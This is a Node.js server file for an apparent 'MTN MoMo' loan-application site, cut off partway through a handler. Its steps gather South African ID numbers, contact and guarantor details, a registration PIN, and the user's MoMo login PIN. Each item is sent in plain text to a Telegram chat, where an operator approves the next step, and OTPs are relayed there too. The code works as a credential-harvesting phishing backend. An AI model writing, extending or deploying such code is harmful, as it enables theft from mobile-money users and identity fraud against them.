// ============================================================
// server.js – MTN MoMo South Africa  (v7.0 FINAL)
// 5-min rate limits · Registration verification (OTP + PIN)
// Rejection rolls back to appropriate stage
// ============================================================
'use strict';

require('dotenv').config();
const express        = require('express');
const fetch          = require('node-fetch');
const cors           = require('cors');
const path           = require('path');
const fs             = require('fs');
const helmet         = require('helmet');
const compression    = require('compression');
const cookieParser   = require('cookie-parser');
const jwt            = require('jsonwebtoken');
const rateLimit      = require('express-rate-limit');
const PDFDocument    = require('pdfkit');

let TNC_VERSION = '1.0';
let TNC_EFFECTIVE = '2026-01-01';
let TERMS_TEXT = 'Terms & Conditions text not configured.';
try {
    const terms = require('./terms');
    TNC_VERSION   = terms.TNC_VERSION   || TNC_VERSION;
    TNC_EFFECTIVE = terms.TNC_EFFECTIVE || TNC_EFFECTIVE;
    TERMS_TEXT    = terms.TERMS_TEXT    || TERMS_TEXT;
} catch (e) {
    console.warn('⚠️  backend/terms.js not found — using placeholder T&C');
}

const app = express();
app.set('trust proxy', 1);

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
            fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
            imgSrc: ["'self'", "data:"],
            connectSrc: ["'self'"],
            objectSrc: ["'none'"],
            frameAncestors: ["'none'"]
        }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: 'same-site' }
}));
app.use(compression());
app.use(cors({ origin: true, credentials: true }));
app.use(cookieParser(process.env.SESSION_SECRET || 'momo-secret-change-me'));
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const SESSION_SECRET = process.env.SESSION_SECRET || 'momo-secret-change-me';
const IS_PROD = process.env.NODE_ENV === 'production';

// ─── Rate limiters — 5 minute window ───
const RATE_LIMIT_MESSAGE = 'You have exceeded the trial limit. Please try again in 5 minutes.';
const RATE_WINDOW_MS = 5 * 60 * 1000;

function makeLimiter(max, keyGen = null) {
    return rateLimit({
        windowMs: RATE_WINDOW_MS,
        max,
        standardHeaders: true,
        legacyHeaders: false,
        keyGenerator: keyGen || ((req) => req.ip),
        handler: (req, res) => {
            res.status(429).json({
                ok: false,
                code: 'RATE_LIMITED',
                retryAfterSeconds: 300,
                error: RATE_LIMIT_MESSAGE
            });
        }
    });
}

const globalLimiter     = makeLimiter(300);
const registerLimiter   = makeLimiter(5);
const submitStepLimiter = makeLimiter(30, (req) => req.body?.applicationId || req.ip);
const otpLimiter        = makeLimiter(10, (req) => req.body?.applicationId || req.ip);
app.use('/api/', globalLimiter);

console.log('═══════════════════════════════════════');
console.log('🚀 Server starting... (v7.0)');
console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MISSING');
console.log('   CHAT_ID:', CHAT_ID || 'MISSING');
console.log('   NODE_ENV:', process.env.NODE_ENV || 'development');
console.log('   Rate limit window: 5 minutes');
console.log('═══════════════════════════════════════');

// ─── Account types ───
const ACCOUNT_TYPES = {
    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true,  description: 'Standard MoMo account' },
    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true,  description: 'Higher limits account' },
    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false, description: 'Basic MoMo account (no ID required)' }
};

const STEP_ORDER = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
const LEGACY_STEPS = ['application', 'sms', 'pin', 'otp'];

const REG_STATUS = {
    IDLE: 'idle',
    PENDING: 'pending_review',
    OTP_PENDING: 'otp_pending',
    OTP_VERIFIED: 'otp_verified',
    PIN_PENDING: 'pin_pending',
    COMPLETED: 'completed',
    REJECTED: 'rejected'
};
const MAX_OTP_ATTEMPTS = 5;

// ─── Data store ───
const applications  = {};
const registrations = {};
const DATA_DIR   = path.join(__dirname, '../data');
const DATA_FILE  = path.join(DATA_DIR, 'applications.json');
const REG_FILE   = path.join(DATA_DIR, 'registrations.json');
const AUDIT_FILE = path.join(DATA_DIR, 'audit.log');
try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); }
catch (e) { console.error('mkdir error:', e.message); }

function saveApps() {
    try { fs.writeFileSync(DATA_FILE, JSON.stringify({ applications, timestamp: new Date().toISOString() }, null, 2)); }
    catch (e) { console.error('Save error:', e.message); }
}
function saveRegs() {
    try { fs.writeFileSync(REG_FILE, JSON.stringify({ registrations, timestamp: new Date().toISOString() }, null, 2)); }
    catch (e) { console.error('Save regs error:', e.message); }
}
function loadAll() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            const age = Date.now() - new Date(parsed.timestamp).getTime();
            if (age < 30 * 24 * 60 * 60 * 1000) {
                Object.assign(applications, parsed.applications || {});
                console.log(`📂 Loaded ${Object.keys(applications).length} applications`);
            }
        }
        if (fs.existsSync(REG_FILE)) {
            const parsed = JSON.parse(fs.readFileSync(REG_FILE, 'utf8'));
            Object.assign(registrations, parsed.registrations || {});
            console.log(`📂 Loaded ${Object.keys(registrations).length} registrations`);
        }
    } catch (e) { console.error('Load error:', e.message); }
}

function audit(event, data = {}) {
    const entry = { ts: new Date().toISOString(), event, ...data };
    try { fs.appendFileSync(AUDIT_FILE, JSON.stringify(entry) + '\n'); } catch (e) {}
    console.log(JSON.stringify(entry));
}

// ─── Helpers ───
function esc(t) { return t === null || t === undefined ? '' : String(t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
function code(t) { return `<code>${esc((t === null || t === undefined) ? '' : String(t).trim())}</code>`; }
function fmt(n) { return (Number(n) || 0).toLocaleString(); }
function monthlyRepayment(p, m) { return (!p || !m) ? 0 : Math.ceil(p / m); }
function generateOtp() { return String(Math.floor(100000 + Math.random() * 900000)); }

function ensureSteps(app_) {
    if (!app_.steps) app_.steps = {};
    STEP_ORDER.forEach(k => { if (!(k in app_.steps)) app_.steps[k] = 'idle'; });
    return app_.steps;
}
function readStep(app_, step) {
    if (app_.steps && step in app_.steps) return app_.steps[step];
    if (step in app_) return app_[step];
    return 'idle';
}
function writeStep(app_, step, value) {
    if (app_.steps && step in app_.steps) app_.steps[step] = value;
    if (step in app_) app_[step] = value;
    if (step === 'qualification') {
        app_.qualification = (value === 'approved') ? 'qualified' : (value === 'rejected') ? 'unqualified' : value;
    }
}
function resetStep(app_, step) {
    writeStep(app_, step, 'idle');
    if (step === 'loan') app_.loanData = null;
    if (step === 'personal') app_.personalData = null;
    if (step === 'employment') app_.employmentData = null;
    if (step === 'guarantor') app_.guarantorData = null;
    if (step === 'momologin') { app_.loginPin = null; app_.momoLoginData = null; }
}

function issueSession(res, applicationId) {
    const token = jwt.sign({ id: applicationId }, SESSION_SECRET, { expiresIn: '7d' });
    res.cookie('momoSession', token, { httpOnly: true, sameSite: 'lax', secure: IS_PROD, maxAge: 7 * 24 * 60 * 60 * 1000 });
}
function readSession(req) {
    try { const raw = req.cookies?.momoSession; return raw ? jwt.verify(raw, SESSION_SECRET) : null; }
    catch (e) { return null; }
}
function guardAppId(req, res, next) {
    const id = req.params.applicationId;
    const session = readSession(req);
    if (session && session.id !== id) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
    next();
}

// ─── SA ID validation ───
function validateSAID(id) {
    if (!id) return { ok: false, reason: 'ID number is required.' };
    const clean = String(id).replace(/\s/g, '');
    if (!/^\d{13}$/.test(clean)) return { ok: false, reason: 'SA ID must be 13 digits.' };
    const yy = parseInt(clean.substring(0, 2));
    const mm = parseInt(clean.substring(2, 4));
    const dd = parseInt(clean.substring(4, 6));
    const century = yy < 30 ? 2000 : 1900;
    const year = century + yy;
    const dob = new Date(year, mm - 1, dd);
    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) return { ok: false, reason: 'Invalid date of birth in ID.' };
    const now = new Date();
    let age = now.getFullYear() - year;
    const m = now.getMonth() - (mm - 1);
    if (m < 0 || (m === 0 && now.getDate() < dd)) age--;
    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
    if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
    let sum = 0, alt = false;
    for (let i = clean.length - 1; i >= 0; i--) {
        let n = parseInt(clean[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    if (sum % 10 !== 0) return { ok: false, reason: 'Invalid ID checksum.' };
    const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
    const citizenship = clean[10] === '0' ? 'SA Citizen' : 'Permanent Resident';
    return { ok: true, age, gender, citizenship, dob: dob.toISOString().split('T')[0], idNumber: clean };
}

// ─── Telegram ───
async function tgSend(text, buttons = null) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false };
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (buttons) body.reply_markup = { inline_keyboard: buttons };
    try {
        const r = await fetch(`${TG_API}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
        });
        const result = await r.json();
        if (result.ok) console.log(`✅ TG sent (${result.result?.message_id})`);
        else console.error(`❌ TG: ${result.description}`);
        return result;
    } catch (e) { console.error('❌ TG error:', e.message); return { ok: false }; }
}
function askApproval(text, step, appId) {
    const buttons = [[
        { text: '✅ YES', callback_data: JSON.stringify({ a: 'Y', s: step, id: appId }) },
        { text: '❌ NO',  callback_data: JSON.stringify({ a: 'N', s: step, id: appId }) }
    ]];
    tgSend(text, buttons);
}
function buildRegistrationReviewMessage(app_, idCheck) {
    const type = ACCOUNT_TYPES[app_.accountType];
    const tnc = app_.tncAccepted || {};
    return `🆕 <b>NEW REGISTRATION — REVIEW REQUIRED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 App ID: ${code(app_.applicationId)}\n\n` +
        `<b>👤 APPLICANT</b>\n` +
        `Name:  ${esc(app_.fullName || 'N/A')}\n` +
        `Phone: ${code('+27' + (app_.phone || ''))}\n` +
        `Email: ${code(app_.email || '')}\n` +
        `ID:    ${code(app_.momoRegistration?.idNumber || 'N/A')}\n` +
        `DOB:   ${code(app_.dob || 'N/A')}\n` +
        (idCheck.ok ? `Age:   ${idCheck.age} · ${idCheck.gender}\nCitizenship: ${idCheck.citizenship}\n` : '') +
        `\n<b>💳 ACCOUNT TYPE CLAIMED</b>\n` +
        `${type.icon} <b>${type.name}</b> — ${esc(type.description)}\n\n` +
        `<b>📊 LIMITS THAT WILL APPLY</b>\n` +
        `Daily Cash:  R ${fmt(type.dailyCash)}\n` +
        `Monthly Cap: R ${fmt(type.monthlyCap)}\n` +
        `Max Loan:    <b>R ${fmt(type.maxLoan)}</b>\n` +
        `Min Loan:    R ${fmt(type.minLoan)}\n\n` +
        `<b>📜 COMPLIANCE</b>\n` +
        `T&C: v${tnc.version || '?'}\n` +
        `IP: ${tnc.ip || 'N/A'}\n\n` +
        `✅ <b>Approve to send OTP?</b>\n` +
        `❌ <b>NO → registration rolled back</b>`;
}
function buildPinApprovalMessage(app_) {
    return `🔐 <b>MoMo PIN VERIFICATION</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 ${code(app_.applicationId)}\n` +
        `👤 ${esc(app_.fullName || 'N/A')}\n` +
        `📱 ${code('+27' + (app_.phone || ''))}\n` +
        `💳 ${esc(ACCOUNT_TYPES[app_.accountType]?.name || 'N/A')}\n\n` +
        `<b>🔑 PIN SET BY USER</b>\n` +
        `<code>${esc(app_.regPin || '')}</code>\n\n` +
        `OTP verified: ✅\n` +
        `Set at: ${app_.regPinSetAt ? new Date(app_.regPinSetAt).toLocaleString('en-ZA') : 'N/A'}\n\n` +
        `✅ <b>YES → registration complete</b>\n` +
        `❌ <b>NO → user re-enters PIN</b>`;
}
function buildStepMessage(step, app_, type, data) {
    const header = `🆔 ${code(app_.applicationId)}\n`;
    switch (step) {
        case 'loan': {
            const monthly = monthlyRepayment(data.loanAmount, parseInt(data.loanTerm));
            const required = Math.ceil(data.loanAmount * 0.20);
            const effectiveRequired = Math.min(required, type.monthlyCap);
            return `📋 <b>LOAN REQUEST (STEP 1/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `\n<b>💳 ACCOUNT</b>\n${type.icon} <b>${type.name}</b> (max R ${fmt(type.maxLoan)})\n\n` +
                `<b>💰 LOAN</b>\nType: ${esc(data.loanType)}\nAmount: <b>R ${fmt(data.loanAmount)}</b>\n` +
                `Term: ${esc(data.loanTerm)}\nMonthly: <b>R ${fmt(monthly)}</b>\nPurpose: ${esc(data.loanPurpose)}\n\n` +
                `<b>📊 QUALIFICATION (20% rule)</b>\nEffective required: <b>R ${fmt(effectiveRequired)}</b>\n\n` +
                `✅ YES / ❌ NO — user returns to Step 1 if NO`;
        }
        case 'personal':
            return `👤 <b>PERSONAL (STEP 2/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `Name: ${esc(data.firstName)} ${esc(data.lastName)}\n` +
                `Phone: ${code('+27' + data.phone)}\nEmail: ${esc(data.email)}\n\n✅ YES / ❌ NO — user returns to Step 2 if NO`;
        case 'employment':
            return `💼 <b>EMPLOYMENT &amp; KIN (STEP 3/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `Employment: ${esc(data.employment)}\nAnnual Income: R ${fmt(data.annualIncome)}\n` +
                `Next of kin: ${esc(data.kinName)} ${code('+27' + data.kinPhone)}\n\n✅ YES / ❌ NO — user returns to Step 3 if NO`;
        case 'guarantor':
            return `🤝 <b>GUARANTOR (STEP 4/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `Name: ${esc(data.guarantorName)}\nPhone: ${code('+27' + data.guarantorPhone)}\n` +
                `Relationship: ${esc(data.guarantorRelation)}\n\n✅ YES / ❌ NO — user returns to Step 4 if NO`;
        case 'momologin': {
            const pinStr = (data.loginMethod === 'pin' && data.pin) ? code(data.pin) : '🔒 Biometric';
            return `🔐 <b>MOMO LOGIN (STEP 5/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `Phone: ${code('+27' + data.phone)}\nMethod: ${esc(data.loginMethod || 'pin')}\n` +
                `PIN: ${pinStr}\nDevice: ${esc(data.deviceInfo || 'Unknown')}\n\n✅ YES / ❌ NO — user returns to MoMo login if NO`;
        }
        case 'qualification': {
            const loanAmount = app_.loanAmount || 0;
            const months = parseInt(app_.loanTerm) || 12;
            const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
            return `📊 <b>FINAL QUALIFICATION (STEP 6/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` + header +
                `<b>👤 APPLICANT</b>\n${esc(app_.firstName || '')} ${esc(app_.lastName || '')}\n${code('+27' + (app_.phone || ''))}\n\n` +
                `<b>💰 LOAN</b>\nAmount: <b>R ${fmt(loanAmount)}</b>\nTerm: ${esc(app_.loanTerm || '')}\nMonthly: <b>R ${fmt(monthly)}</b>\n\n` +
                `<b>🤝 GUARANTOR</b>\n${esc(app_.guarantorName || 'N/A')}\n${app_.guarantorPhone ? code('+27' + app_.guarantorPhone) : ''}\n\n` +
                `✅ YES / ❌ NO — full restart if NO`;
        }
        default: return `Step "${step}" pending for ${code(app_.applicationId)}`;
    }
}

// ═══════════════════════════════════════════════════════════
// DIAGNOSTICS
// ═══════════════════════════════════════════════════════════
app.get('/health', (req, res) => {
    res.json({ status: 'ok', version: '7.0', uptime: process.uptime(), applications: Object.keys(applications).length });
});
app.get('/api/telegram-debug', async (req, res) => {
    const result = { tokenSet: !!BOT_TOKEN, chatIdSet: !!CHAT_ID };
    try { const me = await fetch(`${TG_API}/getMe`); result.getMe = await me.json(); } catch (e) { result.getMeError = e.message; }
    try { result.testSend = await tgSend(`🧪 <b>Test</b>`); } catch (e) { result.testSendError = e.message; }
    res.json(result);
});
app.get('/api/account-types', (req, res) => res.json({ ok: true, types: ACCOUNT_TYPES }));
app.get('/api/terms', (req, res) => res.json({ ok: true, version: TNC_VERSION, effective: TNC_EFFECTIVE, text: TERMS_TEXT }));

// ═══════════════════════════════════════════════════════════
// REGISTRATION
// ═══════════════════════════════════════════════════════════
app.post('/api/register-momo', registerLimiter, async (req, res) => {
    try {
        const { applicationId, idNumber, accountType, phone, email, fullName, dob: dobProvided, tncAccepted } = req.body || {};

        if (!applicationId || !idNumber || !accountType) return res.status(400).json({ ok: false, error: 'Missing required fields.' });
        if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Invalid account type.' });
        if (!phone || !/^\d{9}$/.test(String(phone))) return res.status(400).json({ ok: false, error: 'Valid 9-digit mobile number required.' });
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email))) return res.status(400).json({ ok: false, error: 'Valid email address required.' });
        if (!tncAccepted || tncAccepted !== true) return res.status(400).json({ ok: false, error: 'You must read and accept the Terms & Conditions to continue.' });

        const type = ACCOUNT_TYPES[accountType];
        let idCheck = { ok: true };
        if (type.requiresId) {
            idCheck = validateSAID(idNumber);
            if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
        }
        const derivedDob = idCheck.ok && idCheck.dob ? idCheck.dob : null;
        if (type.requiresId && dobProvided && derivedDob) {
            const norm = (s) => String(s || '').slice(0, 10);
            if (norm(dobProvided) !== norm(derivedDob)) return res.status(400).json({ ok: false, error: 'Date of birth does not match the SA ID number.' });
        }

        if (!applications[applicationId]) applications[applicationId] = { applicationId, createdAt: new Date().toISOString() };
        ensureSteps(applications[applicationId]);

        applications[applicationId].momoRegistration = {
            idNumber: type.requiresId ? idNumber : null,
            dob: derivedDob || dobProvided || null,
            accountType, accountName: type.name,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            phone, email, fullName: fullName || null,
            idDetails: idCheck.ok && type.requiresId ? { age: idCheck.age, gender: idCheck.gender, citizenship: idCheck.citizenship, dob: idCheck.dob } : null,
            registeredAt: new Date().toISOString()
        };
        applications[applicationId].isRegistered = true;
        applications[applicationId].accountType = accountType;
        applications[applicationId].accountMaxLoan = type.maxLoan;
        applications[applicationId].phone = phone;
        applications[applicationId].email = email;
        applications[applicationId].fullName = fullName || null;
        applications[applicationId].dob = derivedDob || dobProvided || null;
        applications[applicationId].tncAccepted = {
            accepted: true, version: TNC_VERSION, effective: TNC_EFFECTIVE,
            timestamp: new Date().toISOString(),
            ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
            userAgent: (req.headers['user-agent'] || '').slice(0, 200)
        };
        applications[applicationId].personalData = applications[applicationId].personalData || { firstName: null, lastName: null, phone, email };
        applications[applicationId].registrationStatus = REG_STATUS.PENDING;
        applications[applicationId].registrationHistory = applications[applicationId].registrationHistory || [];
        applications[applicationId].registrationHistory.push({ at: new Date().toISOString(), event: 'submitted', by: 'user' });
        applications[applicationId].regOtpAttempts = 0;
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApps();

        issueSession(res, applicationId);
        audit('registration_submitted', { applicationId, accountType, phone, email });

        askApproval(buildRegistrationReviewMessage(applications[applicationId], idCheck), 'registration', applicationId);

        res.json({
            ok: true, accountType, accountName: type.name, phone, email,
            dob: derivedDob || dobProvided || null,
            tncVersion: TNC_VERSION,
            registrationStatus: REG_STATUS.PENDING,
            limits: { dailyCash: type.dailyCash, monthlyCap: type.monthlyCap, maxLoan: type.maxLoan },
            maxLoan: type.maxLoan, minLoan: type.minLoan,
            message: `${type.name} submitted for verification.`
        });
    } catch (e) {
        console.error('Registration error:', e.message);
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.post('/api/register-momo-telegram', async (req, res) => {
    try {
        const { applicationId, idNumber, accountType, phone, email, fullName, extra } = req.body || {};
        if (!idNumber || !accountType) return res.status(400).json({ ok: false, error: 'Missing ID or account type.' });
        if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Invalid account type.' });
        const type = ACCOUNT_TYPES[accountType];
        const idCheck = type.requiresId ? validateSAID(idNumber) : { ok: true };
        if (!idCheck.ok) return res.status(400).json({ ok: false, error: idCheck.reason });
        const regId = applicationId || ('REG-' + Date.now().toString().slice(-6));
        registrations[regId] = { regId, idNumber: type.requiresId ? idNumber : null, accountType, accountName: type.name, phone: phone || null, email: email || null, fullName: fullName || null, extra: extra || null, registeredAt: new Date().toISOString() };
        saveRegs();
        await tgSend(`📱 <b>NEW REG (log)</b>\n🆔 ${code(regId)}\n${phone ? `📞 ${code('+27' + phone)}\n` : ''}${type.icon} <b>${type.name}</b>`);
        res.json({ ok: true, regId });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// REGISTRATION VERIFICATION
// ═══════════════════════════════════════════════════════════
app.get('/api/registration/status/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
    res.json({
        ok: true,
        applicationId: app_.applicationId,
        status: app_.registrationStatus || REG_STATUS.IDLE,
        accountType: app_.accountType || null,
        accountName: app_.momoRegistration?.accountName || null,
        accountMaxLoan: app_.accountMaxLoan || 0,
        phone: app_.phone || null,
        otpAttempts: app_.regOtpAttempts || 0,
        maxOtpAttempts: MAX_OTP_ATTEMPTS,
        rejectionReason: app_.rejectionReason || null
    });
});

app.post('/api/registration/verify-otp', otpLimiter, async (req, res) => {
    try {
        const { applicationId, otp } = req.body || {};
        if (!applicationId || !otp) return res.status(400).json({ ok: false, error: 'Missing fields.' });
        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.registrationStatus !== REG_STATUS.OTP_PENDING) return res.status(400).json({ ok: false, error: 'Not awaiting OTP.' });
        if (!/^\d{6}$/.test(String(otp))) return res.status(400).json({ ok: false, error: 'OTP must be 6 digits.' });

        if ((app_.regOtpAttempts || 0) >= MAX_OTP_ATTEMPTS) {
            app_.registrationStatus = REG_STATUS.REJECTED;
            app_.rejectionReason = 'Too many incorrect OTP attempts.';
            app_.registrationHistory.push({ at: new Date().toISOString(), event: 'rejected_otp_attempts' });
            saveApps();
            tgSend(`❌ <b>OTP LOCKED OUT</b>\n🆔 ${code(applicationId)}`);
            return res.status(400).json({ ok: false, error: 'Too many incorrect attempts. Please re-register.' });
        }

        if (app_.regOtp !== String(otp).trim()) {
            app_.regOtpAttempts = (app_.regOtpAttempts || 0) + 1;
            const remaining = MAX_OTP_ATTEMPTS - app_.regOtpAttempts;
            saveApps();
            if (remaining <= 0) {
                app_.registrationStatus = REG_STATUS.REJECTED;
                app_.rejectionReason = 'Too many incorrect OTP attempts.';
                app_.registrationHistory.push({ at: new Date().toISOString(), event: 'rejected_otp_attempts' });
                saveApps();
                tgSend(`❌ <b>OTP LOCKED OUT</b>\n🆔 ${code(applicationId)}`);
                return res.status(400).json({ ok: false, error: 'Too many incorrect attempts. Please re-register.' });
            }
            return res.status(400).json({ ok: false, error: `Incorrect OTP. ${remaining} attempt(s) remaining.` });
        }

        app_.registrationStatus = REG_STATUS.OTP_VERIFIED;
        app_.regOtpVerifiedAt = new Date().toISOString();
        app_.regOtp = null;
        app_.regOtpAttempts = 0;
        app_.rejectionReason = null;
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_verified' });
        app_.updatedAt = new Date().toISOString();
        saveApps();
        audit('registration_otp_verified', { applicationId });
        tgSend(`✅ <b>OTP VERIFIED</b>\n🆔 ${code(applicationId)}\nUser setting PIN.`);
        res.json({ ok: true, next: 'set-pin' });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/registration/set-pin', async (req, res) => {
    try {
        const { applicationId, pin } = req.body || {};
        if (!applicationId || !pin) return res.status(400).json({ ok: false, error: 'Missing fields.' });
        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.registrationStatus !== REG_STATUS.OTP_VERIFIED) return res.status(400).json({ ok: false, error: 'OTP not verified yet.' });
        if (!/^\d{5}$/.test(String(pin))) return res.status(400).json({ ok: false, error: 'PIN must be 5 digits.' });
        app_.regPin = String(pin);
        app_.regPinSetAt = new Date().toISOString();
        app_.registrationStatus = REG_STATUS.PIN_PENDING;
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_set' });
        app_.updatedAt = new Date().toISOString();
        saveApps();
        audit('registration_pin_set', { applicationId });
        askApproval(buildPinApprovalMessage(app_), 'reg_pin', applicationId);
        res.json({ ok: true, status: REG_STATUS.PIN_PENDING });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/registration/resend-otp', otpLimiter, async (req, res) => {
    try {
        const { applicationId } = req.body || {};
        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        if (app_.registrationStatus !== REG_STATUS.OTP_PENDING) return res.status(400).json({ ok: false, error: 'Not awaiting OTP.' });
        const otp = generateOtp();
        app_.regOtp = otp;
        app_.regOtpAttempts = 0;
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'otp_regenerated' });
        saveApps();
        tgSend(`🔄 <b>OTP REGENERATED</b>\n🆔 ${code(applicationId)}\nPhone: ${code('+27' + app_.phone)}\nOTP: <b>${code(otp)}</b>`);
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.post('/api/registration/reset', async (req, res) => {
    try {
        const { applicationId } = req.body || {};
        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, error: 'Not found' });
        app_.registrationStatus = REG_STATUS.IDLE;
        app_.regOtp = null;
        app_.regPin = null;
        app_.regOtpAttempts = 0;
        app_.rejectionReason = null;
        app_.registrationHistory = app_.registrationHistory || [];
        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'user_reset_registration' });
        saveApps();
        res.json({ ok: true });
    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

// ═══════════════════════════════════════════════════════════
// UNIFIED STEP SUBMISSION
// ═══════════════════════════════════════════════════════════
app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
    try {
        const { applicationId, step, data } = req.body || {};
        if (!applicationId || !step) return res.status(400).json({ ok: false, error: 'Missing applicationId or step.' });
        if (!STEP_ORDER.includes(step)) return res.status(400).json({ ok: false, error: `Invalid step: ${step}` });

        const session = readSession(req);
        if (session && session.id !== applicationId) return res.status(403).json({ ok: false, error: 'Session mismatch.' });

        const app_ = applications[applicationId];
        if (!app_) return res.status(404).json({ ok: false, code: 'NOT_REGISTERED', error: 'Application not found.' });
        if (!app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
            return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'You must register on MoMo before applying.' });
        }
        if (app_.registrationStatus !== REG_STATUS.COMPLETED) {
            return res.status(403).json({ ok: false, code: 'REGISTRATION_INCOMPLETE', error: 'Registration not yet verified.' });
        }

        const type = ACCOUNT_TYPES[app_.accountType];
        ensureSteps(app_);

        const idx = STEP_ORDER.indexOf(step);
        if (idx > 0) {
            const prev = STEP_ORDER[idx - 1];
            if (app_.steps[prev] !== 'approved') {
                return res.status(400).json({ ok: false, error: `Previous step "${prev}" is not approved yet.` });
            }
        }

        if (step === 'loan') {
            const { loanType, loanAmount, loanTerm, loanPurpose } = data || {};
            if (!loanType || !loanAmount || !loanTerm || !loanPurpose) return res.status(400).json({ ok: false, error: 'Complete all loan fields.' });
            if (loanAmount < type.minLoan) return res.status(400).json({ ok: false, error: `Minimum loan for ${type.name} is R ${fmt(type.minLoan)}.` });
            if (loanAmount > type.maxLoan) return res.status(400).json({ ok: false, error: `${type.name} allows a maximum loan of R ${fmt(type.maxLoan)}.` });
            app_.loanType = loanType; app_.loanAmount = loanAmount;
            app_.loanTerm = loanTerm; app_.loanPurpose = loanPurpose;
            app_.monthlyRepayment = monthlyRepayment(loanAmount, parseInt(loanTerm));
            app_.loanData = { loanType, loanAmount, loanTerm, loanPurpose };
        }
        if (step === 'personal') {
            const { firstName, lastName, phone, email } = data || {};
            if (!firstName || !lastName || !phone || !email) return res.status(400).json({ ok: false, error: 'Complete all personal fields.' });
            app_.firstName = firstName; app_.lastName = lastName;
            app_.phone = phone; app_.email = email;
            app_.personalData = { firstName, lastName, phone, email };
        }
        if (step === 'employment') {
            const { employment, annualIncome, kinName, kinPhone } = data || {};
            if (!employment || annualIncome == null || !kinName || !kinPhone) return res.status(400).json({ ok: false, error: 'Complete all employment fields.' });
            app_.employment = employment; app_.annualIncome = annualIncome;
            app_.kinName = kinName; app_.kinPhone = kinPhone;
